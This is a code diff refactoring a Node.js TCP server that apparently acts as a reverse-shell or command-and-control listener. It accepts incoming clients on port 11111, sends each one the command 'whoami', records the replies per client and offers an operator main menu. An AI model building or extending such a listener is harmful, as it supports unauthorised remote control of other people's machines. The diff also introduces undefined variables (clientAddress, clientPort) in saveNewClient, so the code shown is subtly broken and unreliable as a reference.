@@ -1,6 +1,6 @@
 "use strict";
 const net = require("net");
-const util = require("../utils.js");
+const manageServer = require("../manage_server.js");
 const port = 11111;
 const socketClients = require("./clients.js");
 const server = net.createServer((client) => {
@@ -8,7 +8,7 @@ const server = net.createServer((client) => {
         switch (error.code) {
             case "ECONNRESET":
                 console.log("\[-] Client disconnected!");
-                util.getClientCount(server);
+                manageServer.getClientCount(server);
                 break;
             default:
                 break;
@@ -30,36 +30,39 @@ server.on("connection", (client) => {
     // Response is saved by "data" event since it's the first request.
     client.write("whoami");
 
-    util.getClientCount(server);
-    util.mainMenu();
+    manageServer.getClientCount(server);
+    manageServer.mainMenu();
 
-    client.on("data", (data) =>  {
+    client.on("data", async (data) =>  {
         try {
-            const currentClient = util.getClientConnection(client);
-            const dataToString = data.toString().replace("\n", "");
-            currentClient.responseHistory.push(dataToString);
+            const currentClient = await manageServer.getClientConnection(client);
+            // Prevent newline being added to shell prompt.
+            const clientResponse = data.toString().replace("\n", "");
+            currentClient.responseHistory.push(clientResponse);
             currentClient.messageCount++;
-            if (currentClient.messageCount <= 1) {
-                currentClient.name = dataToString;
+            const SECOND_MESSAGE = 1;
+            // Save the `whoami` response in the current client's profile.
+            if (currentClient.messageCount <= SECOND_MESSAGE) {
+               setClientName(currentClient, clientResponse);
+
                 return;
             } else {
-                console.log(dataToString);
+                console.log(clientResponse);
             }
         } catch {
             console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`);
         }
     });
-
-    client.on("disconnect", () => {
-
-    })
 });
 
-
-
 const saveNewClient = (client) => {
-    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.remotePort}`);
-    socketClients.push({ address : `${client.remoteAddress}:${client.remotePort}`, client, messageCount : 0, name: "", responseHistory : [] });    
+    const fullClientAddress = `${clientAddress}:${clientPort}`;
+    console.log(`[+] Connection receieved: ${fullClientAddress}`);
+    socketClients.push({ address : `${fullClientAddress}`, client, messageCount : 0, name: "", responseHistory : [], uptime: 0 });    
+}
+
+const setClientName = (client, name) => {
+    client.name = name;
 }
 
 module.exports = server;
